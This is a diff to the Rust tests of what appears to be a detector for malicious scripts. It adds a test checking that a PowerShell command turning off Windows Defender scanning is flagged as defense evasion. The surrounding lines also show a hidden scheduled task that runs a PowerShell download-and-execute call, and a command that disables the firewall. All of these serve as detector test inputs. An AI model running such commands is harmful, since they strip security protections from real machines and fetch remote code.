@@ -2772,6 +2772,28 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn set_mppreference_additional_disable_options_emit_defender_evasion_traits() {
+        let script = br#"powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmailScanning 1 -DisableRemovableDriveScanning:true"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for action in [
+            "setmp-disablearchivescanning",
+            "setmp-disableemailscanning",
+            "setmp-disableremovabledrivescanning",
+        ] {
+            assert!(
+                report
+                    .traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::DefenderEvasion { action: existing_action, .. } if existing_action == action)),
+                "missing DefenderEvasion {action}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn powershell_firewall_profile_disable_emits_defender_evasion_trait() {
         let script =
             br#"powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
